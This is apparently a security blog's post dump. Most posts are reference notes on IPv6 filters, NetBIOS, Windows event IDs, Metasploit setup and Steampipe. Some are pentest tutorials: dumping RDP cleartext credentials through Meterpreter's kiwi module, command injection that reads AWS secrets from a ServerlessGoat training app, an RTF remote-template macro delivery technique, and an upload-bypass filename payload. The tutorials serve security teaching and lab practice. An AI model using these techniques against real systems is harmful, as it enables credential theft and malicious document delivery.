http://XX.XX.XX.XX/evil.asp;.jpg%00\n```"},{"fields":{"slug":"/i-pv6-wireshark-filters"},"excerpt":"Wireshark filter for Router Advertisements (RA) icmpv6.type == 134\n\n\nneighbor advertisement:\n\nicmpv6.type == 136\n\n\nneighbor solicitation:\n\nicmp…","frontmatter":{"date":"6th March 2022 ","title":"IPv6 Wireshark Filters","description":"List of IPv6 Wireshark Filters","tags":"ipv6","posttype":"article"},"body":"# IPv6 WireShark Filters\n\nWireshark filter for Router Advertisements (RA)\n\n```bash\nicmpv6.type == 134\n```\n\nneighbor advertisement:\n\n```bash\nicmpv6.type == 136\n```\n\nneighbor solicitation:\n\n```bash\nicmpv6.type == 135\n```\n\nrouter solicitation:\n\n```bash\nicmpv6.type == 133\n```\n\nRedirect:\n\n```bash\nicmpv6.type == 137\n```"},{"fields":{"slug":"/ssh-connecting-to-legacy-servers"},"excerpt":null,"frontmatter":{"date":"6th March 2022 ","title":"SSH - Connecting To Legacy Servers","description":"","tags":null,"posttype":"article"},"body":"Accept more legacy ciphers. Lowers hardening for support for older clients. \nhttps://www.kali.org/docs/general-use/ssh-configuration/\n\n\n\nCiphers: ssh -Q cipher\nMACs: ssh -Q mac\nKexAlgorithms: ssh -Q kex\nPubkeyAcceptedKeyTypes: ssh -Q key\n\n\nUse the `-G` option to see negotiation \n\nUse the `-vv` for verbose.\n\n\nnmap --script ssh2-enum-algos -sV -p <port> <host>\n\n\n\n\n```\nsudo apt install libssl1.0-dev\nwget -c https://mirror.ox.ac.uk/pub/OpenBSD/OpenSSH/portable/openssh-6.0p1.tar.gz\ntar -xzf openssh-6.0p1.tar.gz\ncd openssh-6.0p1/\n./configure --prefix=/opt/openssh-6.0p1/\n./configure --prefix=/opt/openssh-6.0p1/\nmake \nmake install \n```\n<img src=\"/static/c38f2220-e15a-46c4-a306-9bd78f59f012.png\">\n![]()\n\n\n/etc/ssh/ssh_config.d/kali-wide-compat.conf\n<img src=\"/static/77ebcb2a-7c9d-46a4-bdc2-492183739299.png\">\n![]()"},{"fields":{"slug":"/dumping-rdp-credentials-for-logged-in-user"},"excerpt":"In this tutorial, we will assume you have a Meterpreter Shell On a Windows Box Migrate current process into explorer.exe\n\nmigrate -N explorer…","frontmatter":{"date":"28th February 2022 ","title":"Dumping RDP Credentials For Logged In User","description":"Dumping RDP Credentials For Logged In User","tags":null,"posttype":"tutorial"},"body":"In this tutorial, we will assume you have a Meterpreter Shell On a Windows Box\n\nMigrate current process into `explorer.exe`\n```\nmigrate -N explorer.exe\n```\n\nTake a look at the systems running processes. Here we are looking for  `mstsc.exe`. The `mstsc.exe` \n\n\"Creates connections to Remove Desktop Session Host Servers of other remote computers.\"\n\nSource:\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc\n\nNow we load the Kiwi Module in Meterpreter\n```\nload kiwi\n```\n\nNow we want to look if there are any active sessions running using the kiwi module\n```\nkiwi_cmd ts::sessions\n```\n\nExample output below. Here we can see one active Administrator from the marvel domain. \n```\n\nSession: 0 - Services\n  state: Disconnected (4)\n  user :  @ \n  curr : 2/28/2022 12:16:21 AM\n  lock : no\n\nSession: *1 - Console\n  state: Active (0)\n  user : Administrator @ MARVEL\n  Conn : 2/27/2022 11:08:55 PM\n  logon: 2/27/2022 11:09:03 PM\n  curr : 2/28/2022 12:16:21 AM\n  lock : no\n\nSession: 65536 - RDP-Tcp\n  state: Listen (6)\n  user :  @ \n  lock : no\n```\n\nAttempt to drop clear text credentials. \n```\nkiwi_cmd ts::mstsc\n```\n\nExample output\n```\nServerName                                [wstring] '10.10.10.250'\nServerFqdn                                [wstring] ''\nUserSpecifiedServerName                   [wstring] '10.10.10.250'\nUserName                                  [wstring] 'Administrator'\nDomain                                    [wstring] 'MARVEL'\nPassword                                  [protect] 'Passw0rd!'\nSmartCardReaderName                       [wstring] ''\nPasswordContainsSCardPin                  [ bool  ] FALSE\nServerNameUsedForAuthentication           [wstring] '10.10.10.250'\nRDmiUsername                              [wstring] ''\n```\n\nNow RDP into the box. \n```\nxfreerdp /u:Administrator /p:Passw0rd! /v:10.10.10.250\nrdesktop -u Administrator -p Passw0rd! 10.10.10.250\n```"},{"fields":{"slug":"/understand-net-bios-names-in-minutes"},"excerpt":null,"frontmatter":{"date":"26th February 2022 ","title":"Understand NetBIOS Names in Minutes","description":"This article serves as an introduction and quick reference to NetBIOS names","tags":null,"posttype":"article"},"body":"\nNetBIOS names made easy. This article serves as a simplified introduction to NetBIOS names and suffixes; consider this if you are running late for exam prep or having to debug output from your terminal.\n\nIf you wish you learn more about NetBIOS, see EvilSaint's article at https://evilsaint.com/article/protocol-dissection-netbios-smb/.\n\n## What is the purpose of NetBIOS?\n\nIt lets computers in a local area network to share resources.\n<img src=\"/static/832745c2-95cc-45f6-a712-56f0da41b6e4.png\">\n![]()\n\n## Does Linux support NetBIOS?\n\nYes - by installing SAMBA. \n\n## What are NetBIOS names?\n\nThese are names that have specific meanings. These meanings explain what the computer can do in context of NetBIOS resource sharing. \n\nBasic syntax of a NetBIOS name is:\n\n```\n<computername/domain/workgroup>  <suffix>  <type>\n```\n\nOr in form of an example,\n\n```\nMYCOMPUTER <00> UNIQUE\n```\n\nThe above example means:\n\n```\nMy computer is called \"MYCOMPUTER\". \nIt supports the Workstation Service (\"<00>\") which means that it supports file and printer sharing.\nMy computer name is the only one with this name in this network, making it \"UNIQUE\".\n```\n\nYour computer probably has <b>at least three</b> NetBIOS names (depending what is installed on it). I.e., your computer wears \"at least three different hats\",  \n\nYou can view your computers' NetBIOS names with:\n\n```\nnbtstat  -n\n```\n\nSample output is below.\n\n```\n       Name               Type         Status\n    ---------------------------------------------\n    MYCOMPUTER     <00>  UNIQUE      Registered\n    MYCOMPUTER     <20>  UNIQUE      Registered\n    WORKGROUP      <00>  GROUP       Registered\n```\n\nThe `status` just means it is registered by broadcast or with a WINS server; however this is not of interest for now.\n\nThe latter two NetBIOS names translate to:\n\n```\nMy computer is called \"MYCOMPUTER\". \nIt supports File Sharing (\"<20>\") which means that it shares files within the network. \nMy computer name is the only one with this name in this network, making it \"UNIQUE\".\n```\n\nand\n\n```\nMy computer is part of a \"WORKGROUP\" and not a domain. \nIt supports the Workstation Service (\"<00>\") which means that it supports file and printer sharing within the workgroup. \nThe Workgroup my computer is a part of is a \"GROUP\" and it other computers are part of this.\n```\n\nAs demonstrated above, NetBIOS names tend to identify the UNIQUE and GROUP attributes of the computer in question. \n\n## Unique\n\nA unique name applies to a single IP address.\n\nThe UNIQUE attribute refers to:\n\n* uniquename; workstation, server, etc,\n* username (in some cases)\n\n## Group - Domain vs Workgroup\n\nA group name, which applies to a subnet group of IP addresses\n\nThe WORKGROUP attribute refers to:\n\n* peer to peer network\n* users being able to login using their own device only\n* smaller group than a domain\n\nThe DOMAIN attribute refers to:\n\n* users being able to log in with their credentials to any \"office\" device\n* bigger group than a workgroup\n\n## Technical details - NetBIOS Names + Suffixes\n\nMost common ones.\n\nUNIQUE\n------\nCOMPUTERNAME\t\t<00>  UNIQUE\tWorkstation Service\t\t\tCan access network shares\nCOMPUTERNAME\t\t<03>  UNIQUE        Windows Messenger Service\t\tSends messages between users in network\nCOMPUTERNAME\t\t<06>  UNIQUE\tRemote Access Service                    Provides remote access services\t\t\t\nCOMPUTERNAME\t\t<20>  UNIQUE\tFile Service\t\t\t\t\tShares files in network\nCOMPUTERNAME\t\t<21>  UNIQUE\tRemote Access Service client\t\tActs as a remote access service client\nDOMAIN\t\t\t\t<1B>  UNIQUE\tDomain Master Browser\t\t\tPrimary Domain Controller of domain <-- <b>DC</b>\nWORKGROUP/DOMAIN\t<1D>  UNIQUE\tMaster Browser\t\t\t\tLocal browser server for subnet of domain or workgroup\n\nGROUP\n-----\nWORKGROUP/DOMAIN         <00>  GROUP  \tWorkgroup/domain name\tIs part of this workgroup or domain and can access shared resources within it\n__MSBROWSE__\t\t\t<01>  GROUP\t\tMaster Browser\t\t\tIs the primary browser for this workgroup/domain\nWORKGROUP/DOMAIN     \t<1C>  GROUP\t\tDomain Controllers \t\tIs part of Domain Controllers group of workgroup or domain\t\nWORKGROUP/DOMAIN     \t<1E>  GROUP\t\tBrowser Service Elections\tBrowser service election server\n\n\n## `net` commands to use\n\nAll `net` commands all use NetBIOS host names.\n\nTo list NetBIOS connections (file share, printer share), use:\n\n```\nnet use \nnet use UNC\n```\n\n\n\nTo check your computer, \nnbtstat -a IP ADDRESS\n\nYour computer name --> probably at least three NetBIOS names depending what installed with Windows NT.\n\nworkstation service = enables print and file sharing \nwin10 -- > automatically started on boot\nenable access to network shares\n\nover LAN\nfiles + printers \nsession layer\n\nservice or name record type such as host record, master browser record, domain controller recors, or other services\nindividual service --> suffix\nNetBIOS name --> mac 16 ASCII chars --> 16th char = suffix\n    --> HEX : 00 is one byte\n--> friendly name --> 15-char name : computer name, domain name, name of user logged on\n--> domain, computer or user name + service type / function\n\n\n\n\n\nhttps://en.wikipedia.org/wiki/NetBIOS\nFor unique names:\nsingle IP address\nworkstation\nserver\nmessenger service\n\n00: Workstation Service (workstation name)\n03: Windows Messenger service\n06: Remote Access Service\n20: File Service (also called Host Record)\n21: Remote Access Service client\n1B: Domain Master Browser – Primary Domain Controller for a domain\n1D: Master Browser\n\nFor group names:\n\n00: Workstation Service (workgroup/domain name)\n1C: Domain Controllers for a domain (group record with up to 25 IP addresses)\n1E: Browser Service Elections\n\n\nExample:\n\nWhat is \n<computername> 00 U\n\nA: Workstation \n\nhttps://evilsaint.com/article/protocol-dissection-netbios-smb/\nnbtscan <ip-range> \n\tNetBIOS name and MAC\n\nnbtscan -v -s : <ip-range>\n\tservice Identifier\n\n* workgroup `<00>` group - This name is a remnant of the original LAN Manager browse service.\n* workgroup `<1D>` unique - This name identifies the Local Master Browser (LMB, sometimes called simply \"Master Browser\") for a subnet. <-- SUBNET of DOMAIN or WORKGROUP(?)\n* workgroup `<1E>` -  group A node that is capable of acting as a \"Browser\" registers this group name to listen for election announcements.\n* nt_domain `<1B>` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use. <-- combines infor for DOMAIN = DOMAIN CONTROLLER\n* nt_domain `<1C>` Internet group Registered by all Domain Controllers in the given NT Domain.\n\nMASTER BROWSER : computer that \n\n\nHow to list for individual computer\n> nbtstat /a WIN-TUEFA0TGVTB\n--> Name: computer name\n--> Type: computer name type (unique or group)\n--> Status: registered / not\n\n distinguished by whether they are\n\n\nA multihomed name, which applies to a multicast group of IP addresses\n"},{"fields":{"slug":"/fixing-common-errors-power-shell-remoting-from-kali"},"excerpt":null,"frontmatter":{"date":"25th February 2022 ","title":"Fixing Common Errors PowerShell Remoting From Kali","description":"In this article, I will briefly explain how to fix common issues when trying to PowerShell Remote From Kalil.","tags":"error-message, kali-linux, powershell","posttype":"article"},"body":"\nAssuming you have powershell installed on Kali. \n\n// Insert link or brief description of installing PowerShell on Kali. \n\n\n\n## Problem 1\n\nWhen you try and perform PowerShell remoting the first time you will probably see the following error. \n\n\"Enter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.\" \n\n```\n┌──(consultant㉿pentest)-[~]\n└─$ pwsh \nPowerShell 7.1.4\nCopyright (c) Microsoft Corporation.\n\nhttps://aka.ms/powershell\nType 'help' to get help.\n\nPS /home/consultant> $cred = Get-Credential\n\nPowerShell credential request\nEnter your credentials.\nUser: Administrator\nPassword for user Administrator: *********\n\nPS /home/consultant> Enter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication Negotiate\nEnter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.\nPS /home/consultant> \n```\n<img src=\"/static/86717c1c-326e-405e-a56f-4bcb1d38a049.png\">\n\n\nThe problem here is that the library is looking for packages that do not exist. \n\n\nIn this case, our PowerShell is located in the following path `/opt/microsoft/powershell/7`\n\nif we do\n```\nldd /opt/microsoft/powershell/7/libmi.so \n\tlinux-vdso.so.1 (0x00007ffc7bbe9000)\n\tlibpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff9e2e02000)\n\tlibdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff9e2dfb000)\n\tlibpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007ff9e2de9000)\n\tlibssl.so.1.0.0 => not found\n\tlibcrypto.so.1.0.0 => not found\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff9e2c0f000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007ff9e3010000)\n\tlibaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007ff9e2bdb000)\n\tlibcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007ff9e2bd3000)\n\n```\n\n<img src=\"/static/adfdb756-450d-4869-a4d9-f6862bb0ba16.png\">\n\n\nIn that directory, we need to add our symlinks:\n\n\n```\ncd /usr/lib/x86_64-linux-gnu \nsudo ln -s /usr/lib/x86_64-linux-gnu/libssl.so.1.0.2 libssl.so.1.0.0\nsudo ln -s /usr/lib/x86_64-linux-gnu/libcrypto.so.1.0.2 libcrypto.so.1.0.0\n```\n<img src=\"/static/0743039e-e8ad-49d5-9d64-91588530b5f6.png\">\n\n\nNow fixed!\n\n\n## Problem 2\n\nYou get a `MI_RESULT_ACCESS_DENIED` error message.\n```\nEnter-PSSession : MI_RESULT_ACCESS_DENIED\n```\n\nThis is probably because you missed off the `-Authentication` flag on your command\n\nCheck if you are typing in something like this\n```\nEnter-PSSession -ComputerName 192.168.1.235 -Credential $cred \n```\n\nThe solution is to use `-Authentication Negotiate`\n```\nEnter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication Negotiate\n```\n\n\n## Problem 3\n\nErrors with non-Kerberos authentication i.e. because you are not domain-joined\n\nIf you have seen this error when trying to connect with Negotiate because you are not domain-joined. \n\n\"Enter-PSSession: Connecting to remote server 192.168.1.235 failed with the following error message : acquiring creds with username only failed An invalid name was supplied SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.\"\n\nFrom trying to type in a command such as \n```\nPS /home/consultant> Enter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication Negotiate\nEnter-PSSession: Connecting to remote server 192.168.1.235 failed with the following error message : acquiring creds with username only failed An invalid name was supplied SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.\n```\n<img src=\"/static/7a048cd7-7167-4242-9c30-710c29d5b01b.png\">\n\n\nThis is because you need the following package installed on your kali Linux\n```\nsudo apt-get install gss-ntlmssp\n```\n\nAfter this, you should be able to connect."},{"fields":{"slug":"/wsl-2-installing-metasploit-framework-with-kali-linux"},"excerpt":null,"frontmatter":{"date":"25th February 2022 ","title":"WSL2 - Installing Metasploit Framework with Kali Linux","description":"This article demonstrates how to install the Metasploit Framework with Kali Linux on WSL2.","tags":"kali-linux, wsl2","posttype":"article"},"body":"\nThis article demonstrates how to install the Metasploit Framework with Kali Linux on WSL version 2. When installing Kali Linux for WSL2 using Microsoft Store, its file size is minimised by including the bare essentials by default.\n\n#Pre-requisites\n\nThis example assumes that you have the following:\n\n- Windows Subsystem For Linux version 2 (WSL2) - This example is not tested on WSL version 1\n- Kali Linux for WSL2\n\n#Instructions\n\n<h5 class=\"step\">Step 1 - Update the repositories</h5>\n\n```\nsudo apt update\n```\n\n<h5 class=\"step\">Step 2 - Install and enable PostgreSQL</h5>\n\n```\nsudo apt install postgresql\nsudo /etc/init.d/postgresql start\n```\n\n<h5 class=\"step\">Step 3 - Download the Metasploit Framework installation file</h5>\n\n```\nwget https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb\n```\n\n<h5 class=\"step\">Step 4 - Install the Metasploit Framework</h5>\n\n```\n./msfupdate.erb\n```\n\n<h5 class=\"step\">Step 5 -Verify the installation</h5>\n\nTo confirm that the Metasploit Framework was successfully installed, attempt to launch components supported by the framework.\n\nTo launch the Metasploit Framework command-line interface, run:\n\n```\nmsfconsole\n```\n\nThe below screen capture displays `msfconsole` launched with an ASCII-art banner.\n<img src=\"/static/429fbf45-6b3a-4372-8e75-15ad3e5d60cd.png\">\n![](/media/markdown/2022/02/26/)\n\nYou can use `exit` to exit msfconsole and attempt to launch the `msfvenom`, the command-line instance of Metasploit.\n\n```\nmsfconsole\n```\n\nIf the installation was successful, the help page will be displayed as demonstrated below.\n<img src=\"/static/fa427e84-580d-4edb-847d-e09776009dd1.png\">\n![](/media/markdown/2022/02/26/)"},{"fields":{"slug":"/security-log-reference"},"excerpt":null,"frontmatter":{"date":"17th February 2022 ","title":"Security Log Reference","description":"This article serves as a quick reference for Windows Security Log event IDs.","tags":"security-logs, windows","posttype":"article"},"body":"This article serves as a quick reference for Windows Security Log event IDs.\n\n# Windows Security Log Reference\n\nTo Open the security log run\n```\neventvwr.msc\n```\n\nThen in the console tree, expand Windows Logs, and then click Security. The results pane lists individual security events.\n\n## User Account Changes\n\n| Event ID | Description                                  |\n|----------|----------------------------------------------|\n| 4720     | Created                                      |\n| 4722     | Enabled                                      |\n| 4723     | User changed own password                    |\n| 4724     | Privileged User changed this user's password |\n| 4725     | Disabled                                     |\n| 4726     | Deleted                                      |\n| 4738     | Changed                                      |\n| 4740     | Locked out                                   |\n| 4767     | Unlocked                                     |\n| 4781     | Name change                                  |\n\n## Domain Controller Authentication Events\n\n\n| Event ID | Description                                                                                |\n|----------|--------------------------------------------------------------------------------------------|\n| 4768     | A Kerberos authentication ticket (TGT) was requested                                       |\n| 4771     | Kerberos pre-authentication failed                                                         |\n| 4820     | A Kerberos TGT was denied because the device does not meet the access control restrictions |\n\n\n## Logon Session Events (Correlate by Logon ID)\n\n| Event ID | Description                             |\n|----------|-----------------------------------------|\n| 4624     | Successful logon                        |\n| 4647     | User initiated logoff                   |\n| 4625     | Logon failure {See Logon Failure Codes) |\n| 4778     | Remote desktop session reconnected      |\n| 4779     | Remote desktop session disconnected     |\n| 4800     | Workstation locked                      |\n| 4801     | Workstation unlocked                    |\n| 4802     | Screen saver invoked                    |\n| 4803     | Screen saver dismissed                  |\n\n## Logon Types\n\n| Type ID | Description                   |\n|---------|-------------------------------|\n| 2       | Interactive                   |\n| 3       | Network (i.e. mapped drive)   |\n| 4       | Batch                         |\n| 5       | Service (service startup)     |\n| 7       | Unlock                        |\n| 8       | Network Cleartext             |\n| 10      | Remote Desktop                |\n| 11      | Logon with cached credentials |\n\n\n## Security Group Changes\n\n\n| Action         | Local | Global | Universal |\n|----------------|-------|--------|-----------|\n| Created        | 4731  | 4727   | 4754      |\n| Changed        | 4735  | 4737   | 4755      |\n| Deleted        | 4734  | 4730   | 4758      |\n| Member Added   | 4732  | 4728   | 4756      |\n| Member Removed | 4733  | 4729   | 4757      |\n\n\n## Distribution Group Changes\n\n| Action         | Local | Global | Universal |\n|----------------|-------|--------|-----------|\n| Created        | 4744  | 4749   | 4759      |\n| Changed        | 4745  | 4750   | 4760      |\n| Deleted        | 4748  | 4753   | 4763      |\n| Member Added   | 4746  | 4751   | 4761      |\n| Member Removed | 4747  | 4752   | 4762      |"},{"fields":{"slug":"/cloud-hacking-serverless-function-injection"},"excerpt":null,"frontmatter":{"date":"16th February 2022 ","title":"Cloud Hacking :- Serverless Function Injection","description":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.","tags":"cloud, how-to, serverless-functions","posttype":"article"},"body":"In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.\n\n##What is a function?\n\nIt is a piece of code that you can use over and over again to perform a task.\n\n##What is serverless?\n\nIn serverless architecture, you are building and running code on someone else's computer. In cloud context, the computer belongs to the cloud provider and resides on their premises. Because the computer serves your code, it is referred to as a server. The cloud provider is responsible for maintaining the server and, thus, you are left with a \"serverless\" setting.\n\n##Piecing it together - A serverless function\n\nA serverless function is a piece of code that runs on the cloud provider's computer and it can perform a task over and over again.\n\n##What are some examples of serverless functions?\n\n* AWS Lambda\n* Microsoft Azure Functions\n* Google Cloud Functions\n\nTo perform a task, the function requires an event or a trigger. These events or triggers can originate from different sources. Examples include:\n\n* HTTP APIs\n* Changes in systems like databases\n* Other alerting systems\n\n##Where does the injection come in?\n\nIn context of serverless functions, injection vulnerabilities occur when unexpected input is sent to the function. The process of sending unexpected input can be referred to as an injection attack. \n\n##Why does it work?\n\nTwo aspects come into play:\n\n1. Your ability to control variables passed to the function;\n3. Whether the server trusts your input and executes it.\n\nIn case of command injection vulnerabilities, the function should run shell or operating system commands in the background.\n\nNow that we have our foundations set up, let us demonstrate this with an easy-to-follow example.\n\n#Serverless event-data injection\n\nThis example demonstrates how to execute unwanted code via a serverless function. To do this example, you will only require a browser. We have done this example using the OWASP ServerlessGoat web application, which you can find in the below URL.\n\n* https://www.serverless-hack.me/\n\nThe application converts Doc files to text from a URL. The output is then displayed on the screen.\n\n<img src=\"/static/b576cf8f-2a9d-43b3-a1d1-3ed12f9b0f12.png\">\n\nIn case of OWASP ServerlessGoat, the injection vulnerability occurs when the Doc filename is appended with code that gets executed. \n\n##Instructions\n\n<h5 class=\"step\">Step 1 - Navigate to https://www.serverless-hack.me/</h5>\n\nThe vulnerable app resides here. You can alternatively create your own serverless functions in the cloud!\n\n<h5 class=\"step\">Step 2 - Append the filename with the command you want to execute.</h5>\n\nFor example, using a semi-comma to separate the filename from the command you want to execute will print out the environment variables:\n```\nhttps://www.puresec.io/hubfs/document.doc;env\n```\n\nThe output will display a secret (the AWS secret access key)!\n\n<img src=\"/static/96002e52-8f1b-496a-ba9c-0c4631826a30.png\">\n\nOr to output text of your choice, you can use the \"echo\" command:\n```\nhttps://www.puresec.io/hubfs/document.doc;echo \"hello\"\n```\n\nDisplayed below is \"hello\" echoed back to us.\n\n<img src=\"/static/6359b91a-fa74-45f0-b9c2-52f5b3a49fae.png\">\n\n\nTo understand why this works, you may wish to review the code used for the function:\n```\nconst child_process = require('child_process');\nconst AWS = require('aws-sdk');\nconst uuid = require('node-uuid');\n\nasync function log(event) {\n  const docClient = new AWS.DynamoDB.DocumentClient();\n  let requestid = event.requestContext.requestId;\n  let ip = event.requestContext.identity.sourceIp;\n  let documentUrl = event.queryStringParameters.document_url;\n\n  await docClient.put({\n      TableName: process.env.TABLE_NAME,\n      Item: {\n        'id': requestid,\n        'ip': ip,\n        'document_url': documentUrl\n      }\n    }\n  ).promise();\n\n}\n\nexports.handler = async (event) => {\n  try {\n    await log(event);\n\n    let documentUrl = event.queryStringParameters.document_url;\n\n    let txt = child_process.execSync(`curl --silent -L ${documentUrl} | /lib64/ld-linux-x86-64.so.2 ./bin/catdoc -`).toString();\n\n    // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file.\n    let key = uuid.v4();\n    let s3 = new AWS.S3();\n    await s3.putObject({\n      Bucket: process.env.BUCKET_NAME,\n      Key: key,\n      Body: txt,\n      ContentType: 'text/html',\n      ACL: 'public-read'\n    }).promise();\n\n    return {\n      statusCode: 302,\n      headers: {\n        \"Location\": `${process.env.BUCKET_URL}/${key}`\n      }\n    };\n  }\n  catch (err) {\n    return {\n      statusCode: 500,\n      body: err.stack\n    };\n  }\n};\n```\n\n##Well that was easy... What next?\n\nWhy not look into executing other commands or practice with creating your own serverless functions next?"},{"fields":{"slug":"/using-steampipe-on-aws"},"excerpt":"Installing steam pipe sudo /bin/sh -c \"$(curl -fsSL https://raw.githubusercontent.com/turbot/steampipe/main/install.sh)\"\n\n\nChecking the steam…","frontmatter":{"date":"15th February 2022 ","title":"Using Steampipe on AWS","description":"Steampipe is a tool that lets us gather information from AWS (or other sources) and lets us interact with that data the same way we would a relational database via SQL style queries.","tags":"steampipe, aws","posttype":"tutorial"},"body":"Installing steam pipe \n```\nsudo /bin/sh -c \"$(curl -fsSL https://raw.githubusercontent.com/turbot/steampipe/main/install.sh)\"\n```\n\nChecking the steam pipe version\n```\nsteampipe -v\n```\n\nInstalling steampipe plugin\n```\nsteampipe plugin install steampipe\n```\n\n\nMaking queries with steampipe\n```\nsteampipe query \"select name from steampipe_registry_plugin;\"\n```\n\nInstalling the AWS plugin\n```\nsteampipe plugin install aws\n```\n\nSetting up AWS access keys and secrets for Single Sign On environments\n```\naws configure sso\n```\n\n\nConfiguring AWS access keys and secrets for standard environments\n```\naws configure\n```\n\nConfiguring the AWS configuration file for steampipe. \n```\nnano ~/.steampipe/config/aws.spc\n```\n\nDropping down into an interactive query session. \n```\nsteampipe query\n```\n\nListing tables that are available\n```\n.tables\n```\n\nInspecting a table to see what columns it has\n```\n.inspect aws_iam_role\n```\n\n\nExample query \n```\nselect \n  group_name,\n  group_id\nfrom\n  aws_vpc_security_group_rule\nwhere \n  type = 'ingress'\n  and cidr_ip = '0.0.0.0/0';\n.quit\n```\n\nRunning compliance checks involves an additional module\n```\ngit clone https://github.com/turbot/steampipe-mod-aws-compliance.git\n```\n\nTo run the following commands we need to enter the newly created directory\n```\ncd steampipe-mod-aws-compliance\n```\n\nWe can either run all of the checks\n```\nsteampipe check all\n```\n\nOr specfic versions. \n```\nsteampipe check benchmark.cis_v140\n```\n\nIf needed we can even export a report in html and csv format\n```\nsteampipe check benchmark.cis_v140 --export=report.html --export=report.csv\n```"},{"fields":{"slug":"/rtf-template-injection"},"excerpt":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.…","frontmatter":{"date":"9th February 2022 ","title":"RTF Template Injection","description":"In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.","tags":"exploit-development, rtf","posttype":"article"},"body":"\nIn this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.\n\n## What is an RTF file?\n\nTapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?\n\nRTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type. \n\n## Why should I care?\n\n\"Why should I care?\" you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!  \n\n# Instructions - RTF template injection with a calculator pop-up\n\nIn this example, we will demonstrate how to use the \"template\" control word to cause an RTF file to fetch another file from a web server controlled by us.  This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.\n\n<h5 class=\"step\">Step 1 - Create a macro-enabled Word template file</h5>\n\nThis file will contain our macro that executes the calculator app when the RTF file is opened. \n\nOpen Word and add the following Visual Basic code (macro) to it. Save the file as `calc.dotm`. \n\n```\nSub AutoOpen()\nDim Program As String\nDim TaskID As Double\nProgram = \"calc.exe\"\nTaskID = Shell(Program, 1)\nEnd Sub\n```\n\n*If you are unfamiliar with creating Word template files, we recommend checking out Microsoft's documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.*\n\n<h5 class=\"step\">Step 2 - Start a web server</h5>\n\nLaunch an HTTP server in the folder containing the 'calc.dotm' file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice. \n\n```\npython3 -m http.server <port number>\n```\n\n<h5 class=\"step\">Step 3 - Create a benign RTF file</h5>\n\nGet or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.\n\n![](5e05c49b-2704-464a-9eb8-6afe16b298ec.png)\n\n*There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.*\n\n<h5 class=\"step\">Step 4 - Add remote template fetching capabilities to the RTF file</h5>\n\nUse a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo. \n\nLook for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font's ending tag with your listening IP and port + payload/file to fetch. \n\n```\n{\\*\\template http://<your-IP>:<port number>/calc.dotm}\n```\n\n![](514cab5a-57fa-4783-9db1-35ca3867a8ef.png)\n\n<h5 class=\"step\">Step 5 - Show time</h5>\n\nSave the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.\n\nThe below screen capture displays the macro-enabled template file being fetched.\n\n![](20e0eb7d-9a66-4ff2-991c-366e9a7a3d84.png)\n\nThe below screen capture displays the RTF file opened and the calculator app launched.\n\n![](c6ec75ba-dad0-4755-903a-7de8f5065320.png)\n\n### Well that was easy... Where to from here?\n\nI hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?"},{"fields":{"slug":"/speaking-aws"},"excerpt":null,"frontmatter":{"date":"9th February 2022 ","title":"Speaking AWS","description":"aws, cloud, s3-buckets, scoutsuite","tags":"aws, cloud, s3-buckets, scoutsuite","posttype":"article"},"body":"# Introduction To Terminology\n\n\n| AWS Term                             | Pentester Analogy                                                                           